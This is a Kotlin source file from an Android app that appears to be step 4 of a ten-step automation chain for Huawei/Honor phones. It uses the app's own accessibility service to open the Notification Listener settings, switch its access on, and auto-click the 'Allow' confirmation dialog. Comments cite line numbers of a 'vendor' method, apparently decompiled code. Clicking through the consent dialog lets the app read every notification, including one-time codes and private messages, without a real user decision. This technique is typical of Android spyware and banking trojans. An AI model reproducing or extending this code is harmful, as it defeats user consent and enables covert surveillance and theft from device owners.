package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.content.Context
import android.content.Intent
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchClassNames
import kotlinx.coroutines.delay

/**
 * Step 4/10 -- Notification Listener (vendor m212170b7, L3725-4164).
 *
 * Only runs on Honor devices (vendor L1373: f55064a2==true).
 * Opens ACTION_NOTIFICATION_LISTENER_SETTINGS, toggles the app's NLS switch ON,
 * handles the confirm dialog, then verifies.
 */
class HuaweiStep4NotifListener(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep4NotifListener"
    }

    @Suppress("UNUSED_PARAMETER")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step4/10] enter executeStep4NotificationListener (isHuawei=${steps.isHuawei})")
        if (steps.isHuawei) {
            HuaweiStepLogger.skip(4, "非荣耀跳过 (vendor L1338 f55064a2=true)", logs)
            return
        }
        HuaweiStepLogger.phase(4, "通知使用权开始", "vendor L3767", logs)

        if (isStep4Completed()) {
            HuaweiStepLogger.skip(4, "SP 已标记完成", logs)
            return
        }

        val maxOuterRetry = 2
        for (outerAttempt in 1..maxOuterRetry) {
            logs.add("[Step4/10] 第 $outerAttempt 次尝试 (vendor L3779)")

            logs.add("[Step4/10] 步骤1: 打开通知使用权设置页面 (vendor L3780)")
            try {
                val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                    flags = 276824064
                }
                val launcher: Context = service ?: steps.ctx
                launcher.startActivity(intent)
            } catch (e: Exception) {
                failures.add("[Step4/10] 启动通知使用权页面失败: ${e.message}")
                return
            }

            val pageLoaded = waitForNotifListenerPage()
            if (!pageLoaded) {
                logs.add("[Step4/10] 通知使用权页面未加载，重试 (vendor L3977)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step4/10] 达到最大重试次数，流程结束 (vendor L3774-3776)")
                    return
                }
                continue
            }

            logs.add("[Step4/10] 步骤3: 点击'${steps.appLabel}'的开关 (vendor L3844)")
            toggleAppSwitchInNlsPage()
            logs.add("[Step4/10] 已尝试点击开关: ${steps.appLabel} (vendor L3846)")

            delay(300L)

            logs.add("[Step4/10] 步骤4: 处理弹窗 (vendor L3852)")
            val dialogHandled = handleNlsConfirmDialog()
            if (dialogHandled) {
                logs.add("[Step4/10] 点击: 允许 (vendor L3909)")
            } else {
                logs.add("[Step4/10] 未检测到弹窗，可能已开启 (vendor L3918)")
            }

            logs.add("[Step4/10] 步骤5: 验证开启状态 (vendor L3921)")
            try {
                service?.performGlobalAction(1)
            } catch (_: Exception) { }

            delay(300L)
            val verified = verifyNlsSwitchChecked()
            HuaweiStepLogger.probe(4, "verifyNlsSwitchChecked", verified)
            if (verified) {
                HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP4_NOTIFICATION_LISTENER)
                HuaweiStepLogger.success(4, "通知使用权已授权 + SP mark", "vendor L4109", successes)
            } else {
                HuaweiStepLogger.warn(4, "开关未开启 — 不 mark SP", "下次启动会重试", logs)
            }
            return
        }

        logs.add("[Step4/10] 通知使用权流程结束（可能未成功）(vendor L3775-3776)")
    }

    // ---- helpers ----

    private fun isStep4Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP4_NOTIFICATION_LISTENER)

    private suspend fun waitForNotifListenerPage(): Boolean {
        val maxPolls = 10
        for (poll in 0 until maxPolls) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val nodes = try {
                    root.findAccessibilityNodeInfosByText("通知使用权")
                } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty() && nodes.any { it.isVisibleToUser }) {
                    return true
                }
            }
            delay(100L)
        }
        return false
    }

    private fun toggleAppSwitchInNlsPage(): Boolean {
        return ui.openSwitch(steps.appLabel)
    }

    private suspend fun handleNlsConfirmDialog(): Boolean {
        for (poll in 0 until 10) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val dialogNodes = try {
                    root.findAccessibilityNodeInfosByText("是否启用")
                } catch (_: Exception) { null }
                if (!dialogNodes.isNullOrEmpty() && dialogNodes.any { it.isVisibleToUser }) {
                    val allowNodes = try {
                        root.findAccessibilityNodeInfosByText("允许")
                    } catch (_: Exception) { null }
                    val allowVisible = !allowNodes.isNullOrEmpty() && allowNodes.any { it.isVisibleToUser }
                    if (allowVisible) {
                        val clicked = ui.clickSelector("[text=\"允许\"][visibleToUser=true]")
                        if (clicked) {
                            return true
                        }
                    }
                    return true
                }
            }
            delay(100L)
        }
        return false
    }

    private fun verifyNlsSwitchChecked(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val appNodes = try {
            root.findAccessibilityNodeInfosByText(steps.appLabel)
        } catch (_: Exception) { null } ?: return false

        for (appNode in appNodes) {
            if (!appNode.isVisibleToUser) continue
            val parent = try { appNode.parent } catch (_: Exception) { null } ?: continue
            val childCount = parent.childCount
            for (i in 0 until childCount) {
                val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
                val className = child.className?.toString() ?: continue
                if (SwitchClassNames.isSwitch(className)) {
                    return child.isChecked
                }
            }
        }
        return false
    }
}
